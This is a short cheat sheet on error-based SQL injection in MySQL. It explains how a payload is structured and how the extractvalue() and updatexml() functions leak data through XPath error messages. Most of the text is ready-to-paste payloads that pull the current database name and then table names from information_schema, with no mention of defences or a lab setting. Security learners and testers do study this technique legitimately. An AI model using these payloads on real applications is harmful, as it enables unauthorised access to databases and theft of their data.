Error-Based SQL Injection

Basic Injection Structure

' AND payload-- -

Part| Purpose
"'"| Break original query
"AND / OR"| Inject condition
"payload"| Malicious query
"-- -"| Comment remaining query

---

Core Functions

extractvalue()

extractvalue(XML_document, XPath_expression)

updatexml()

updatexml(XML_document, XPath_expression, new_value)

Both trigger XPath errors which leak data in the error message.

---

Helper Functions

concat()        → combine strings
group_concat()  → combine multiple rows
substring()     → extract part of a string
limit           → fetch rows one by one
database()      → current database name

---

1️⃣ Extract Database Name

extractvalue

' AND extractvalue(1,concat('~',database(),'~'))-- -

updatexml

' AND updatexml(1,concat('~',database(),'~'),1)-- -

---

2️⃣ Extract Table Names

extractvalue

' AND extractvalue(1,concat('~',
(SELECT table_name FROM information_schema.tables LIMIT 0,1)
,'~'))-- -

updatexml

' AND updatexml(1,concat('~',
(SELECT table_name FROM information_schema.tables LIMIT 0,1)
,'~'),1)-- -

